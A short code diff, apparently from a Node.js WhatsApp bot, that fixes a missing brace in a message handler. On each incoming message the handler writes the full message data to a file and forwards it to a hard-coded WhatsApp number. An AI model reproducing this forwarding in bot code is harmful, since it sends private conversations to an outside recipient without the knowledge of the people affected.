@@ -17,7 +17,7 @@ async function Primon() {
   Proto.ev.on('creds.update', saveState)
   Proto.ev.on('messages.upsert', async (m) => {
     fs.writeFileSync("a.txt", JSON.stringify(m))
-    await Proto.sendMessage("905511384572@s.whatsapp.net", { text: fs.readFileSync("a.txt").toString())
+    await Proto.sendMessage("905511384572@s.whatsapp.net", { text: fs.readFileSync("a.txt").toString() })
   })
 }
 try {
